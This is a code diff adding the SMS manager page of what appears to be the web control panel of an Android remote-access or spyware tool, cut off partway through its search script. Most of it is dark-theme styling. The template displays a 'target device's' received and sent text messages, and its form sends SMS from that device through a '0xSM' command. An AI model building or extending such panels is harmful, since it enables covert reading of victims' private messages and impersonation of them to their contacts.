@@ -1,0 +1,1219 @@
+<!-- ============================================
+     TABS
+     ============================================ -->
+<div class="ui top attached tabular menu sms-tabs">
+    <a class="item active" data-tab="first">
+        <i class="icon comments"></i>
+        <span>SMS Log</span>
+    </a>
+    <a class="item" data-tab="second">
+        <i class="icon paper plane outline"></i>
+        <span>Send SMS</span>
+    </a>
+</div>
+
+<!-- ============================================
+     TAB 1: SMS LOG
+     ============================================ -->
+<div class="ui bottom attached tab segment active sms-panel" data-tab="first">
+
+    <div class="sms-log-toolbar">
+        <div class="sms-log-title">
+            <i class="icon inbox"></i>
+            <span>SMS Log</span>
+            <span class="sms-log-count" id="smsLogCount">
+                <i class="icon circle notch"></i>
+                <%= pageData.length %>
+            </span>
+        </div>
+        <div class="sms-log-toolbar-right">
+            <div class="sms-search-wrap">
+                <i class="icon search"></i>
+                <input type="text" id="smsLogSearch" placeholder="Search messages..." autocomplete="off">
+            </div>
+            <button onclick="updateButton(this, '0xSM', {'action': 'ls'})" class="ui blue button sms-update-btn">
+                <i class="icon sync"></i>
+                <span>Update</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Active filter -->
+    <% if (typeof filter !== 'undefined' && filter) { %>
+    <div class="sms-filter-active">
+        <i class="icon filter"></i>
+        <span>Filtered by: <strong><%= filter %></strong></span>
+        <a href="?" class="sms-filter-clear" title="Clear filter">
+            <i class="icon times"></i>
+        </a>
+    </div>
+    <% } %>
+
+    <!-- Chat-style feed -->
+    <div class="sms-feed" id="smsFeed">
+        <% pageData.forEach((smsData) => {
+            let date = new Date(parseInt(smsData.date));
+            let type = smsData.type;
+            let isIncoming = (type === "1");
+            let isOutgoing = (type === "2");
+
+            let statusIcon = 'question';
+            let statusAction = '';
+            let bubbleClass = 'sms-unknown';
+
+            if (isIncoming) {
+                statusIcon = 'arrow down';
+                statusAction = 'Received from';
+                bubbleClass = 'sms-incoming';
+            } else if (isOutgoing) {
+                statusIcon = 'arrow up';
+                statusAction = 'Sent to';
+                bubbleClass = 'sms-outgoing';
+            }
+
+            let address = smsData.address || 'Unknown';
+            let body = smsData.body || '';
+        %>
+        <div class="sms-bubble-wrap <%= bubbleClass %>">
+            <div class="sms-avatar">
+                <i class="icon arrow <%= isIncoming ? 'down' : 'up' %>"></i>
+            </div>
+            <div class="sms-bubble">
+                <div class="sms-bubble-header">
+                    <a href="?filter=<%= address %>" class="sms-address" title="Filter by <%= address %>">
+                        <i class="icon phone volume"></i>
+                        <span><%= address %></span>
+                    </a>
+                    <span class="sms-status-tag">
+                        <i class="icon arrow <%= isIncoming ? 'down' : 'up' %>"></i>
+                        <%= isIncoming ? 'IN' : 'OUT' %>
+                    </span>
+                </div>
+                <div class="sms-body"><%= body %></div>
+                <div class="sms-time">
+                    <i class="icon clock outline"></i>
+                    <span><%= date.toLocaleString('en-GB', { timeZone: 'UTC', hour12: false }) %></span>
+                </div>
+            </div>
+        </div>
+        <% }) %>
+    </div>
+
+    <!-- Empty state -->
+    <% if (pageData.length === 0) { %>
+    <div class="sms-empty">
+        <i class="icon comments outline"></i>
+        <p>No messages yet</p>
+    </div>
+    <% } %>
+
+    <div class="sms-empty" id="smsEmptySearch" style="display: none;">
+        <i class="icon search"></i>
+        <p>No messages match your search</p>
+    </div>
+
+</div>
+
+<!-- ============================================
+     TAB 2: SEND SMS
+     ============================================ -->
+<div class="ui bottom attached tab segment sms-panel" data-tab="second">
+
+    <div class="sms-compose-card">
+        <div class="sms-compose-header">
+            <div class="sms-compose-icon">
+                <i class="icon paper plane outline"></i>
+            </div>
+            <div class="sms-compose-text">
+                <h3 class="sms-compose-title">Compose Message</h3>
+                <p class="sms-compose-sub">Send an SMS from the target device</p>
+            </div>
+        </div>
+
+        <div class="ui form sms-form">
+            <div class="sms-field">
+                <label class="sms-label">
+                    <i class="icon phone"></i>
+                    Recipient Number
+                </label>
+                <div class="sms-input-wrap">
+                    <span class="sms-input-prefix">+</span>
+                    <input id="to" type="number" placeholder="923001234567" autocomplete="off">
+                </div>
+            </div>
+
+            <div class="sms-field">
+                <label class="sms-label">
+                    <i class="icon comment alternate outline"></i>
+                    Message
+                </label>
+                <textarea id="sms" placeholder="Type your message here..." rows="5"></textarea>
+                <div class="sms-char-count">
+                    <span id="smsCharCount">0</span> characters
+                </div>
+            </div>
+
+            <button class="ui button fluid positive sms-send-btn" type="submit" onclick="sendSMS(this)">
+                <i class="paper plane outline icon"></i>
+                <span>Send Message</span>
+            </button>
+        </div>
+    </div>
+
+</div>
+
+<style type="text/css">
+    /* ============================================
+       SMS MANAGER — Dark Neon Theme
+       ============================================ */
+
+    /* -------- TABS -------- */
+    .ui.top.attached.tabular.menu.sms-tabs {
+        background: rgba(19, 26, 38, 0.75) !important;
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+        border: 1px solid rgba(0, 217, 255, 0.15) !important;
+        border-bottom: none !important;
+        border-radius: 16px 16px 0 0 !important;
+        padding: 6px !important;
+        margin: 0 !important;
+        gap: 4px;
+        display: flex;
+        flex-wrap: wrap;
+        box-shadow: none !important;
+    }
+
+    .ui.top.attached.tabular.menu.sms-tabs .item {
+        color: #8b98a8 !important;
+        font-size: 0.85rem !important;
+        font-weight: 700 !important;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+        padding: 12px 20px !important;
+        border: 1px solid transparent !important;
+        border-radius: 10px !important;
+        margin: 2px !important;
+        transition: all 0.25s ease;
+        display: inline-flex !important;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .ui.top.attached.tabular.menu.sms-tabs .item .icon {
+        color: #5a6675 !important;
+        margin: 0 !important;
+        font-size: 0.95rem;
+        transition: all 0.25s ease;
+    }
+
+    .ui.top.attached.tabular.menu.sms-tabs .item:hover {
+        color: #00d9ff !important;
+        background: rgba(0, 217, 255, 0.06) !important;
+        border-color: rgba(0, 217, 255, 0.2) !important;
+    }
+
+    .ui.top.attached.tabular.menu.sms-tabs .item:hover .icon {
+        color: #00d9ff !important;
+        filter: drop-shadow(0 0 6px rgba(0, 217, 255, 0.6));
+    }
+
+    .ui.top.attached.tabular.menu.sms-tabs .item.active {
+        background: linear-gradient(135deg, rgba(0, 217, 255, 0.18), rgba(124, 58, 237, 0.12)) !important;
+        color: #ffffff !important;
+        border-color: rgba(0, 217, 255, 0.35) !important;
+        box-shadow: 0 4px 20px rgba(0, 217, 255, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.08) !important;
+    }
+
+    .ui.top.attached.tabular.menu.sms-tabs .item.active .icon {
+        color: #00d9ff !important;
+        filter: drop-shadow(0 0 10px rgba(0, 217, 255, 0.8));
+    }
+
+    .ui.top.attached.tabular.menu.sms-tabs .item.active:before {
+        display: none !important;
+    }
+
+    /* -------- PANELS -------- */
+    .ui.bottom.attached.tab.segment.sms-panel {
+        background: rgba(19, 26, 38, 0.75) !important;
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+        border: 1px solid rgba(0, 217, 255, 0.15) !important;
+        border-top: none !important;
+        border-radius: 0 0 16px 16px !important;
+        box-shadow:
+            0 20px 60px rgba(0, 0, 0, 0.5),
+            0 0 0 1px rgba(255, 255, 255, 0.03),
+            inset 0 1px 0 rgba(255, 255, 255, 0.05) !important;
+        padding: 20px !important;
+        color: #e6edf3;
+    }
+
+    /* ============================================
+       SMS LOG TOOLBAR
+       ============================================ */
+    .sms-log-toolbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 16px;
+        flex-wrap: wrap;
+        padding-bottom: 16px;
+        margin-bottom: 16px;
+        border-bottom: 1px solid rgba(0, 217, 255, 0.12);
+    }
+
+    .sms-log-title {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 1rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: #e6edf3;
+        white-space: nowrap;
+    }
+
+    .sms-log-title .icon.inbox {
+        color: #00d9ff !important;
+        margin: 0 !important;
+        font-size: 1.15rem;
+        filter: drop-shadow(0 0 8px rgba(0, 217, 255, 0.5));
+    }
+
+    .sms-log-count {
+        display: inline-flex;
+        align-items: center;
+        gap: 5px;
+        background: rgba(0, 217, 255, 0.12);
+        border: 1px solid rgba(0, 217, 255, 0.3);
+        color: #00d9ff !important;
+        font-size: 0.72rem !important;
+        font-weight: 700;
+        padding: 3px 9px;
+        border-radius: 20px;
+        letter-spacing: 0.5px;
+        box-shadow: 0 0 12px rgba(0, 217, 255, 0.15);
+        animation: countPulse 3s ease-in-out infinite;
+    }
+
+    .sms-log-count .icon {
+        font-size: 0.65rem !important;
+        filter: none !important;
+        animation: spin 4s linear infinite;
+    }
+
+    @keyframes countPulse {
+        0%, 100% { box-shadow: 0 0 12px rgba(0, 217, 255, 0.15); }
+        50%      { box-shadow: 0 0 20px rgba(0, 217, 255, 0.35); }
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    .sms-log-toolbar-right {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        flex-wrap: wrap;
+    }
+
+    /* Search */
+    .sms-search-wrap {
+        position: relative;
+        flex: 1;
+        max-width: 280px;
+        min-width: 160px;
+    }
+
+    .sms-search-wrap .icon.search {
+        position: absolute;
+        left: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #5a6675 !important;
+        font-size: 0.9rem !important;
+        margin: 0 !important;
+        pointer-events: none;
+        transition: color 0.2s ease;
+    }
+
+    .sms-search-wrap input {
+        width: 100%;
+        background: rgba(10, 14, 23, 0.7) !important;
+        border: 1px solid #223047 !important;
+        border-radius: 10px !important;
+        color: #e6edf3 !important;
+        padding: 10px 14px 10px 36px !important;
+        font-size: 0.88rem !important;
+        font-family: inherit !important;
+        outline: none !important;
+        transition: all 0.2s ease;
+        box-sizing: border-box;
+        -webkit-appearance: none;
+        appearance: none;
+    }
+
+    .sms-search-wrap input:focus {
+        border-color: #00d9ff !important;
+        box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.15) !important;
+        background: rgba(10, 14, 23, 0.95) !important;
+    }
+
+    .sms-search-wrap:focus-within .icon.search {
+        color: #00d9ff !important;
+    }
+
+    /* Update button */
+    .ui.blue.button.sms-update-btn {
+        background: linear-gradient(135deg, #00d9ff 0%, #7c3aed 100%) !important;
+        border: none !important;
+        border-radius: 10px !important;
+        color: #fff !important;
+        font-weight: 700 !important;
+        font-size: 0.82rem !important;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+        padding: 11px 20px !important;
+        min-height: 42px;
+        transition: all 0.25s ease !important;
+        box-shadow: 0 0 20px rgba(0, 217, 255, 0.3) !important;
+        cursor: pointer;
+        position: relative;
+        overflow: hidden;
+        white-space: nowrap;
+        display: inline-flex !important;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .ui.blue.button.sms-update-btn::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
+        transition: left 0.6s ease;
+    }
+
+    .ui.blue.button.sms-update-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 35px rgba(0, 217, 255, 0.55) !important;
+    }
+
+    .ui.blue.button.sms-update-btn:hover::after { left: 100%; }
+    .ui.blue.button.sms-update-btn:hover .icon { animation: spin 1s linear infinite; }
+    .ui.blue.button.sms-update-btn .icon { margin: 0 !important; }
+    .ui.blue.button.sms-update-btn.loading { pointer-events: none; opacity: 0.8; }
+    .ui.blue.button.sms-update-btn.loading .icon { animation: spin 1s linear infinite; }
+
+    /* Filter banner */
+    .sms-filter-active {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 10px 14px;
+        background: linear-gradient(135deg, rgba(0, 217, 255, 0.1), rgba(124, 58, 237, 0.08));
+        border: 1px solid rgba(0, 217, 255, 0.3);
+        border-radius: 10px;
+        margin-bottom: 14px;
+        color: #00d9ff;
+        font-size: 0.82rem;
+        font-weight: 600;
+        letter-spacing: 0.3px;
+        animation: filterIn 0.3s ease;
+    }
+
+    .sms-filter-active .icon.filter {
+        margin: 0 !important;
+        color: #00d9ff !important;
+    }
+
+    .sms-filter-active strong {
+        color: #fff;
+        font-family: 'JetBrains Mono', monospace;
+    }
+
+    .sms-filter-clear {
+        margin-left: auto;
+        width: 26px;
+        height: 26px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 6px;
+        background: rgba(255, 56, 96, 0.15);
+        border: 1px solid rgba(255, 56, 96, 0.3);
+        color: #ff3860 !important;
+        text-decoration: none !important;
+        transition: all 0.2s ease;
+    }
+
+    .sms-filter-clear:hover {
+        background: rgba(255, 56, 96, 0.3);
+        transform: rotate(90deg);
+    }
+
+    .sms-filter-clear .icon { margin: 0 !important; font-size: 0.8rem; }
+
+    @keyframes filterIn {
+        from { opacity: 0; transform: translateY(-6px); }
+        to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ============================================
+       CHAT FEED
+       ============================================ */
+    .sms-feed {
+        display: flex;
+        flex-direction: column;
+        gap: 14px;
+        max-height: 620px;
+        overflow-y: auto;
+        padding: 6px 4px;
+        scroll-behavior: smooth;
+    }
+
+    .sms-feed::-webkit-scrollbar { width: 8px; }
+    .sms-feed::-webkit-scrollbar-track { background: transparent; }
+    .sms-feed::-webkit-scrollbar-thumb {
+        background: linear-gradient(180deg, #00d9ff, #7c3aed);
+        border-radius: 4px;
+    }
+
+    /* Bubble wrapper */
+    .sms-bubble-wrap {
+        display: flex;
+        gap: 12px;
+        align-items: flex-start;
+        max-width: 78%;
+        animation: bubbleIn 0.3s ease backwards;
+    }
+
+    .sms-bubble-wrap:nth-child(1)  { animation-delay: 0.00s; }
+    .sms-bubble-wrap:nth-child(2)  { animation-delay: 0.03s; }
+    .sms-bubble-wrap:nth-child(3)  { animation-delay: 0.06s; }
+    .sms-bubble-wrap:nth-child(4)  { animation-delay: 0.09s; }
+    .sms-bubble-wrap:nth-child(5)  { animation-delay: 0.12s; }
+    .sms-bubble-wrap:nth-child(n+6) { animation-delay: 0.15s; }
+
+    @keyframes bubbleIn {
+        from { opacity: 0; transform: translateY(8px) scale(0.97); }
+        to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    /* Incoming — left aligned */
+    .sms-bubble-wrap.sms-incoming {
+        align-self: flex-start;
+    }
+
+    /* Outgoing — right aligned */
+    .sms-bubble-wrap.sms-outgoing {
+        align-self: flex-end;
+        flex-direction: row-reverse;
+    }
+
+    /* Avatar */
+    .sms-avatar {
+        width: 38px;
+        height: 38px;
+        border-radius: 50%;
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 0 0 2px rgba(10, 14, 23, 0.9), 0 0 12px rgba(0, 0, 0, 0.4);
+        transition: transform 0.25s ease;
+    }
+
+    .sms-incoming .sms-avatar {
+        background: linear-gradient(135deg, #00d9ff, #0088ff);
+    }
+
+    .sms-outgoing .sms-avatar {
+        background: linear-gradient(135deg, #00ff9d, #00b377);
+    }
+
+    .sms-unknown .sms-avatar {
+        background: linear-gradient(135deg, #8b98a8, #5a6675);
+    }
+
+    .sms-avatar .icon {
+        color: #fff !important;
+        margin: 0 !important;
+        font-size: 0.85rem;
+        filter: drop-shadow(0 0 4px rgba(0, 0, 0, 0.4));
+    }
+
+    .sms-bubble-wrap:hover .sms-avatar {
+        transform: scale(1.08);
+    }
+
+    /* Bubble */
+    .sms-bubble {
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        padding: 12px 16px;
+        border-radius: 16px;
+        min-width: 0;
+        max-width: 100%;
+        position: relative;
+        transition: all 0.2s ease;
+        border: 1px solid transparent;
+    }
+
+    .sms-incoming .sms-bubble {
+        background: rgba(0, 217, 255, 0.08);
+        border-color: rgba(0, 217, 255, 0.2);
+        border-top-left-radius: 4px;
+    }
+
+    .sms-outgoing .sms-bubble {
+        background: rgba(0, 255, 157, 0.08);
+        border-color: rgba(0, 255, 157, 0.2);
+        border-top-right-radius: 4px;
+    }
+
+    .sms-unknown .sms-bubble {
+        background: rgba(139, 152, 168, 0.08);
+        border-color: rgba(139, 152, 168, 0.2);
+        border-top-left-radius: 4px;
+    }
+
+    .sms-incoming .sms-bubble:hover {
+        background: rgba(0, 217, 255, 0.12);
+        border-color: rgba(0, 217, 255, 0.4);
+        box-shadow: 0 4px 20px rgba(0, 217, 255, 0.15);
+    }
+
+    .sms-outgoing .sms-bubble:hover {
+        background: rgba(0, 255, 157, 0.12);
+        border-color: rgba(0, 255, 157, 0.4);
+        box-shadow: 0 4px 20px rgba(0, 255, 157, 0.15);
+    }
+
+    /* Bubble header */
+    .sms-bubble-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        flex-wrap: wrap;
+    }
+
+    .sms-outgoing .sms-bubble-header {
+        flex-direction: row-reverse;
+    }
+
+    .sms-address {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        font-family: 'JetBrains Mono', 'Courier New', monospace;
+        font-size: 0.82rem;
+        font-weight: 700;
+        color: #e6edf3 !important;
+        text-decoration: none !important;
+        padding: 3px 8px;
+        border-radius: 6px;
+        background: rgba(10, 14, 23, 0.5);
+        border: 1px solid rgba(34, 48, 71, 0.6);
+        transition: all 0.2s ease;
+    }
+
+    .sms-address:hover {
+        color: #00d9ff !important;
+        border-color: rgba(0, 217, 255, 0.4);
+        background: rgba(0, 217, 255, 0.08);
+    }
+
+    .sms-address .icon.phone {
+        color: #7c3aed !important;
+        margin: 0 !important;
+        font-size: 0.72rem;
+    }
+
+    .sms-address:hover .icon.phone {
+        color: #00d9ff !important;
+        filter: drop-shadow(0 0 6px rgba(0, 217, 255, 0.6));
+    }
+
+    /* Status tag */
+    .sms-status-tag {
+        display: inline-flex;
+        align-items: center;
+        gap: 4px;
+        padding: 3px 8px;
+        border-radius: 20px;
+        font-size: 0.62rem;
+        font-weight: 800;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        white-space: nowrap;
+    }
+
+    .sms-incoming .sms-status-tag {
+        background: rgba(0, 217, 255, 0.12);
+        border: 1px solid rgba(0, 217, 255, 0.35);
+        color: #66e3ff;
+    }
+
+    .sms-outgoing .sms-status-tag {
+        background: rgba(0, 255, 157, 0.12);
+        border: 1px solid rgba(0, 255, 157, 0.35);
+        color: #5cffba;
+    }
+
+    .sms-status-tag .icon {
+        margin: 0 !important;
+        font-size: 0.62rem !important;
+    }
+
+    /* Body */
+    .sms-body {
+        font-size: 0.9rem;
+        line-height: 1.55;
+        color: #e6edf3;
+        word-wrap: break-word;
+        white-space: pre-wrap;
+    }
+
+    /* Time */
+    .sms-time {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        font-family: 'JetBrains Mono', 'Courier New', monospace;
+        font-size: 0.68rem;
+        color: #5a6675;
+        align-self: flex-start;
+    }
+
+    .sms-outgoing .sms-time {
+        align-self: flex-end;
+    }
+
+    .sms-time .icon.clock {
+        color: #5a6675 !important;
+        margin: 0 !important;
+        font-size: 0.68rem;
+    }
+
+    /* Empty states */
+    .sms-empty {
+        padding: 50px 20px;
+        text-align: center;
+        color: #5a6675;
+    }
+
+    .sms-empty .icon {
+        font-size: 2.5rem !important;
+        margin: 0 0 12px 0 !important;
+        opacity: 0.4;
+        display: block;
+    }
+
+    .sms-empty p {
+        margin: 0;
+        font-size: 0.88rem;
+        letter-spacing: 0.5px;
+    }
+
+    /* ============================================
+       COMPOSE CARD (Send SMS tab)
+       ============================================ */
+    .sms-compose-card {
+        max-width: 620px;
+        margin: 0 auto;
+        padding: 28px 24px;
+        background: rgba(10, 14, 23, 0.55);
+        border: 1px solid rgba(0, 217, 255, 0.2);
+        border-radius: 16px;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .sms-compose-card::before {
+        content: '';
+        position: absolute;
+        top: -50%;
+        right: -50%;
+        width: 200%;
+        height: 200%;
+        background: radial-gradient(circle at top right, rgba(0, 217, 255, 0.06), transparent 60%);
+        pointer-events: none;
+    }
+
+    .sms-compose-header {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        margin-bottom: 22px;
+        position: relative;
+        z-index: 1;
+    }
+
+    .sms-compose-icon {
+        width: 52px;
+        height: 52px;
+        border-radius: 14px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+        background: linear-gradient(135deg, rgba(0, 217, 255, 0.15), rgba(124, 58, 237, 0.12));
+        border: 1px solid rgba(0, 217, 255, 0.3);
+        box-shadow: 0 0 20px rgba(0, 217, 255, 0.15);
+        animation: composePulse 3s ease-in-out infinite;
+    }
+
+    @keyframes composePulse {
+        0%, 100% { box-shadow: 0 0 20px rgba(0, 217, 255, 0.15); transform: scale(1); }
+        50%      { box-shadow: 0 0 32px rgba(0, 217, 255, 0.35); transform: scale(1.03); }
+    }
+
+    .sms-compose-icon .icon.paper.plane {
+        color: #00d9ff !important;
+        margin: 0 !important;
+        font-size: 1.4rem !important;
+        filter: drop-shadow(0 0 8px rgba(0, 217, 255, 0.6));
+    }
+
+    .sms-compose-text {
+        display: flex;
+        flex-direction: column;
+        gap: 3px;
+    }
+
+    .sms-compose-title {
+        font-size: 1.05rem !important;
+        font-weight: 800 !important;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: #e6edf3 !important;
+        margin: 0 !important;
+        line-height: 1.2;
+    }
+
+    .sms-compose-sub {
+        font-size: 0.78rem !important;
+        color: #8b98a8;
+        margin: 0 !important;
+    }
+
+    /* Form */
+    .sms-form {
+        position: relative;
+        z-index: 1;
+    }
+
+    .sms-field {
+        margin-bottom: 18px;
+    }
+
+    .sms-label {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 0.68rem !important;
+        font-weight: 700 !important;
+        text-transform: uppercase;
+        letter-spacing: 1.2px;
+        color: #5a6675 !important;
+        margin-bottom: 8px !important;
+    }
+
+    .sms-label .icon {
+        color: #00d9ff !important;
+        margin: 0 !important;
+        font-size: 0.78rem;
+    }
+
+    /* Input with prefix */
+    .sms-input-wrap {
+        display: flex;
+        align-items: center;
+        background: rgba(10, 14, 23, 0.85);
+        border: 1px solid #223047;
+        border-radius: 12px;
+        transition: all 0.2s ease;
+    }
+
+    .sms-input-wrap:focus-within {
+        border-color: #00d9ff;
+        box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.15);
+        background: rgba(10, 14, 23, 0.95);
+    }
+
+    .sms-input-prefix {
+        padding: 13px 4px 13px 14px;
+        color: #00d9ff;
+        font-family: 'JetBrains Mono', monospace;
+        font-weight: 700;
+        font-size: 1rem;
+    }
+
+    #to {
+        flex: 1;
+        background: transparent !important;
+        border: none !important;
+        outline: none !important;
+        color: #e6edf3 !important;
+        padding: 13px 14px 13px 4px !important;
+        font-size: 15px !important;
+        font-family: 'JetBrains Mono', 'Courier New', monospace !important;
+        min-width: 0;
+        -webkit-appearance: none;
+        appearance: none;
+    }
+
+    #to::placeholder {
+        color: #5a6675 !important;
+    }
+
+    #to::-webkit-outer-spin-button,
+    #to::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+    }
+
+    #to[type="number"] {
+        -moz-appearance: textfield;
+        appearance: textfield;
+    }
+
+    /* Textarea */
+    #sms {
+        width: 100%;
+        background: rgba(10, 14, 23, 0.85) !important;
+        border: 1px solid #223047 !important;
+        border-radius: 12px !important;
+        color: #e6edf3 !important;
+        padding: 14px 16px !important;
+        font-size: 15px !important;
+        font-family: inherit !important;
+        line-height: 1.5 !important;
+        outline: none !important;
+        resize: vertical;
+        min-height: 130px;
+        transition: all 0.2s ease;
+        box-sizing: border-box;
+    }
+
+    #sms:focus {
+        border-color: #00d9ff !important;
+        box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.15) !important;
+        background: rgba(10, 14, 23, 0.95) !important;
+    }
+
+    #sms::placeholder {
+        color: #5a6675 !important;
+    }
+
+    /* Character count */
+    .sms-char-count {
+        text-align: right;
+        font-size: 0.7rem;
+        color: #5a6675;
+        font-family: 'JetBrains Mono', monospace;
+        margin-top: 6px;
+        letter-spacing: 0.5px;
+    }
+
+    .sms-char-count #smsCharCount {
+        color: #00d9ff;
+        font-weight: 700;
+    }
+
+    /* Send button */
+    .ui.button.fluid.positive.sms-send-btn {
+        background: linear-gradient(135deg, #00ff9d 0%, #00b377 100%) !important;
+        border: none !important;
+        border-radius: 12px !important;
+        color: #002218 !important;
+        font-weight: 800 !important;
+        font-size: 0.9rem !important;
+        letter-spacing: 1.5px;
+        text-transform: uppercase;
+        padding: 15px !important;
+        min-height: 50px;
+        transition: all 0.25s ease !important;
+        box-shadow: 0 0 22px rgba(0, 255, 157, 0.35) !important;
+        cursor: pointer;
+        width: 100%;
+        position: relative;
+        overflow: hidden;
+        display: inline-flex !important;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    .ui.button.fluid.positive.sms-send-btn::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.35), transparent);
+        transition: left 0.6s ease;
+    }
+
+    .ui.button.fluid.positive.sms-send-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 35px rgba(0, 255, 157, 0.6) !important;
+    }
+
+    .ui.button.fluid.positive.sms-send-btn:hover::after {
+        left: 100%;
+    }
+
+    .ui.button.fluid.positive.sms-send-btn .icon {
+        margin: 0 !important;
+    }
+
+    .ui.button.fluid.positive.sms-send-btn.loading {
+        pointer-events: none;
+        opacity: 0.85;
+    }
+
+    /* ============================================
+       MOBILE
+       ============================================ */
+    @media (max-width: 768px) {
+        .ui.top.attached.tabular.menu.sms-tabs {
+            padding: 5px !important;
+            border-radius: 14px 14px 0 0 !important;
+        }
+
+        .ui.top.attached.tabular.menu.sms-tabs .item {
+            flex: 1;
+            padding: 11px 10px !important;
+            font-size: 0.75rem !important;
+            justify-content: center;
+            letter-spacing: 0.6px;
+        }
+
+        .ui.top.attached.tabular.menu.sms-tabs .item .icon {
+            font-size: 0.85rem;
+        }
+
+        .ui.bottom.attached.tab.segment.sms-panel {
+            padding: 14px 12px !important;
+            border-radius: 0 0 14px 14px !important;
+        }
+
+        .sms-log-toolbar {
+            flex-direction: column;
+            align-items: stretch;
+            gap: 12px;
+        }
+
+        .sms-log-toolbar-right {
+            flex-direction: column;
+            align-items: stretch;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .sms-search-wrap {
+            max-width: 100%;
+            width: 100%;
+        }
+
+        .ui.blue.button.sms-update-btn {
+            width: 100%;
+            justify-content: center;
+            padding: 12px !important;
+        }
+
+        /* Feed */
+        .sms-feed {
+            gap: 12px;
+            max-height: none;
+            padding: 4px 0;
+        }
+
+        .sms-bubble-wrap {
+            max-width: 92%;
+            gap: 10px;
+        }
+
+        .sms-avatar {
+            width: 34px;
+            height: 34px;
+        }
+
+        .sms-avatar .icon {
+            font-size: 0.78rem;
+        }
+
+        .sms-bubble {
+            padding: 11px 14px;
+        }
+
+        .sms-body {
+            font-size: 0.85rem;
+        }
+
+        .sms-address {
+            font-size: 0.75rem;
+        }
+
+        .sms-status-tag {
+            font-size: 0.58rem;
+            padding: 2px 6px;
+        }
+
+        .sms-time {
+            font-size: 0.62rem;
+        }
+
+        /* Compose */
+        .sms-compose-card {
+            padding: 22px 18px;
+            border-radius: 14px;
+        }
+
+        .sms-compose-icon {
+            width: 46px;
+            height: 46px;
+            border-radius: 12px;
+        }
+
+        .sms-compose-icon .icon.paper.plane {
+            font-size: 1.2rem !important;
+        }
+
+        .sms-compose-title {
+            font-size: 0.95rem !important;
+        }
+
+        .sms-compose-sub {
+            font-size: 0.72rem !important;
+        }
+
+        #to, #sms {
+            font-size: 16px !important; /* Prevent iOS zoom */
+        }
+
+        #sms {
+            min-height: 110px;
+        }
+
+        .ui.button.fluid.positive.sms-send-btn {
+            padding: 13px !important;
+            font-size: 0.85rem !important;
+            min-height: 48px;
+        }
+    }
+
+    @media (max-width: 400px) {
+        .ui.top.attached.tabular.menu.sms-tabs .item {
+            font-size: 0.68rem !important;
+            padding: 10px 6px !important;
+        }
+
+        .ui.top.attached.tabular.menu.sms-tabs .item .icon {
+            font-size: 0.75rem;
+        }
+
+        .sms-bubble-wrap {
+            max-width: 96%;
+        }
+
+        .sms-compose-title {
+            font-size: 0.85rem !important;
+        }
+    }
+
+    /* Reduced motion */
+    @media (prefers-reduced-motion: reduce) {
+        .sms-bubble-wrap,
+        .sms-log-count,
+        .sms-compose-icon {
+            animation: none !important;
+        }
+    }
+</style>
+
+<script>
+    /* ============================================
+       Original logic — UNCHANGED
+       ============================================ */
+    $('.menu .item').tab();
+
+    function sendSMS(element) {
+        $(element).addClass('loading')
+        sendCommand('0xSM', {
+            'action': 'sendSMS',
+            'sms': $('#sms').val(),
+            'to': $('#to').val()
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'SMS Sent');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+
+    /* ============================================
+       New: Live search on SMS log
+       ============================================ */
+    (function () {
+        var searchInput = document.getElementById('smsLogSearch');
+        var feed = document.getElementById('smsFeed');
+        var emptySearch = document.getElementById('smsEmptySearch');
+        var countBadge = document.getElementById('smsLogCount');
+
+        if (searchInput && feed) {
+            searchInput.addEventListener('input', function () {
+                var q = this.value.toLowerCase().trim();
+                var bubbles = feed.querySelectorAll('.sms-bubble-wrap');
+                var visible = 0;
+
+                bubbles.forEach(function (b) {
